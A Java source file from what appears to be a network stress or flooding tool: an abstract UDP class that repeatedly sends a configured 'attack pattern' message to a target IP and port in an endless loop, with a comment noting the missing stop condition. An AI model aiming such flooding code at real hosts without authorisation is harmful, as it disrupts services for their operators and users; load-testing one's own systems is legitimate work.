package protocols.interfaces;

import utilies.AttackPattern;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

public abstract class UserDatagramProtocolInterface extends Protocol {

    private DatagramSocket socket;
    private DatagramPacket packet;

    public UserDatagramProtocolInterface(AttackPattern attackPattern) {
        super(attackPattern);
    }

    @Override
    public void run() {
        createConnection();
        connect();
        
        //SE DER RUIM AQUI, TEM QUE COLOCAR CONDICAO DE PARADA STOP THREAD
        //while(!Thread.currentThread().isInterrupted() && (this.socket.isConnected() && !this.socket.isClosed())) {
        while(true) {
            writeMessage(getAttackPattern().getMessage());
            try {
                Thread.sleep(getAttackPattern().getAttackRange());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void createConnection() {
        try {
            this.socket = new DatagramSocket(0);
            this.socket.setSoTimeout(getAttackPattern().getConnectionTimeOut());
        } catch (SocketException se) {
            se.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void connect() {
        setAddress(new InetSocketAddress(getAttackPattern().getIP(), getAttackPattern().getPort()));
        this.packet = new DatagramPacket(new byte[1], 1, getAddress());
    }

    public void closeConnection() {
        if(this.socket != null && !this.socket.isClosed() && this.socket.isBound()) {
            this.socket.close();
        }
    }

    public DatagramSocket getSocket() {
        return this.socket;
    }

    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

    public DatagramPacket getPacket() {
        return this.packet;
    }

    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}